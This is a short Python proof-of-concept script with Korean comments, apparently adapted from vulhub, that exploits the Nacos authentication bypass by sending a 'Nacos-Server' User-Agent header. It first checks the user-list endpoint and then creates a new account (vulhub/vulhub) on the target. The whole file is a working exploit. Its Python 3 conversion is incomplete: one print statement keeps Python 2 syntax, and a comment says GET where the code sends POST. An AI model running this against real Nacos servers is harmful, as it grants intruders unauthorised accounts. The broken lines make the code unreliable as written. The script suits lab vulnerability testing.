#!/usr/bin/env python
# -*- coding: utf-8 -*-

# vulhub 코드 그대로 가지고 왔고, 원본 코드는 python 2.x 를 기준으로 하여 python 3.x 기준 문법으로 변경하였습니다. 


import sys

import requests

# User-Agent 가 Nacos-server 일 경우 취약점 발생

headers = {
    "User-Agent": "Nacos-Server"
}


# check 함수는 취약점을 확인하는 함수
# Http get 메소드를 통해 요청을 보내고 200 응답값과 응답 텍스트에 pageItems 가 포함되어있다면 취약점이 존재한다고 판단
def check(target):
    endpoint = "/nacos/v1/auth/users?pageNo=1&pageSize=9"
    r = requests.get(target.strip("/") + endpoint, headers=headers)
    if r.status_code == 200 and "pageItems" in r.text:
        print (target + " has vulnerabilities")
        return True
    print (target + "has not vulnerabilities")
    return False


# add user 함수는 HTTP GET 요청을 보내 세로운 사용자를 추가하는 함수
# 응답이 200 상태 코드이고 응답 텍스트에 create user ok가 포함되면 새로운 사용자가 성공적으로 추가 되었다고 판단
# header 값을 앞서 정의한 headers 로 보냄으로써 취약점 공격

def add_user(target):
    add_user_endpoint = "/nacos/v1/auth/users?username=vulhub&password=vulhub"

    r = requests.post(target.strip("/") + add_user_endpoint, headers=headers)
    if r.status_code == 200 and "create user ok" in r.text:
        print ("Add User Success")
        print ("New User Info: vulhub/vulhub")
        print ("Nacos Login Endpoint: {}/nacos/".format(target))
        exit(1)

    print "Add User Failed"


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print ("Please specify the target: python poc.py http://xxxxx:8848")
        exit(-1)
    if check(sys.argv[1]):
        add_user(sys.argv[1])
